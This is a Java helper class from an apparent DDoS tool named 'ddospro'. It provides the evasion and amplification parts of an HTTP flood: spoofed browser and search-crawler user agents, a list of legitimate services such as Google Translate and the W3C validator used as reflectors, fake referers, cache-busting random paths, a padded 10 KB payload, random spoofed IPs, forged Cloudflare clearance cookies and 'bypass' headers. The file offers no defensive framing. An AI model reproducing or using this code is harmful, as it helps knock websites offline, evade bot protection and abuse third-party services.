package com.mzkyzak.ddospro;

import java.util.Random;
import java.util.UUID;

import okhttp3.Request;

public class Utils {
    private static final Random random = new Random();

    private static final String[] USER_AGENTS = {
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19582",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19577",
        "Mozilla/5.0 (X11) AppleWebKit/62.41 (KHTML, like Gecko) Edge/17.10859 Safari/452.6",
        "Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
        "Mozilla/5.0 (Linux; U; Android 2.3.3; en-us; HTC_DesireS_S510e Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
        "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
        "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
        "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)"
    };

    private static final String[] REFLECTORS = {
        "https://www.google.com/translate?u=",
        "https://translate.google.com/translate?u=",
        "https://add.my.yahoo.com/rss?url=",
        "https://play.google.com/store/search?q=",
        "http://validator.w3.org/feed/check.cgi?url=",
        "http://validator.w3.org/check?uri=",
        "https://drive.google.com/viewerng/viewer?url=",
        "https://developers.google.com/speed/pagespeed/insights/?url="
    };

    private static final String[] REFERERS = {
        "https://www.google.com/", "https://www.facebook.com/",
        "https://www.youtube.com/", "https://www.twitter.com/",
        "https://www.facebook.com/l.php?u=",
        "https://www.facebook.com/sharer/sharer.php?u=",
        "https://drive.google.com/viewerng/viewer?url=",
        "https://www.google.com/translate?u="
    };

    public static String getRandomUserAgent() {
        return USER_AGENTS[random.nextInt(USER_AGENTS.length)];
    }

    public static String getRandomReferer() {
        return REFERERS[random.nextInt(REFERERS.length)];
    }

    public static String getRandomFileName() {
        return UUID.randomUUID().toString().replace("-", "");
    }

    public static String getRandomPath() {
        return "/" + generateRandomString(10);
    }

    public static String getRandomQuery() {
        return "?t=" + System.currentTimeMillis() + "&r=" + random.nextInt(9999);
    }

    public static String getHeavyPayload() {
        StringBuilder sb = new StringBuilder("x=");
        for (int i = 0; i < 1024 * 10; i++) sb.append("A");
        return sb.toString();
    }

    public static String getRandomReflector() {
        return REFLECTORS[random.nextInt(REFLECTORS.length)];
    }

    public static String generateRandomIP() {
        return random.nextInt(256) + "." + random.nextInt(256) + "." + random.nextInt(256) + "." + random.nextInt(256);
    }

    public static String generateFakeCookie() {
        return "cf_clearance=" + UUID.randomUUID() + "; _ga=GA1.2." + random.nextInt(1000000000) + "." + System.currentTimeMillis();
    }

    private static String generateRandomString(int length) {
        String chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < length; i++) sb.append(chars.charAt(random.nextInt(chars.length())));
        return sb.toString();
    }

    public static void addBypassHeaders(Request.Builder builder) {
        builder.header("Accept-Encoding", "gzip, deflate, br")
               .header("Accept-Language", "en-US,en;q=0.9")
               .header("Cache-Control", "max-age=0")
               .header("Connection", "keep-alive")
               .header("Sec-Fetch-Dest", "document")
               .header("Sec-Fetch-Mode", "navigate")
               .header("Sec-Fetch-Site", "none")
               .header("Sec-Fetch-User", "?1")
               .header("Sec-Gpc", "1")
               .header("Pragma", "no-cache")
               .header("Upgrade-Insecure-Requests", "1");
    }
}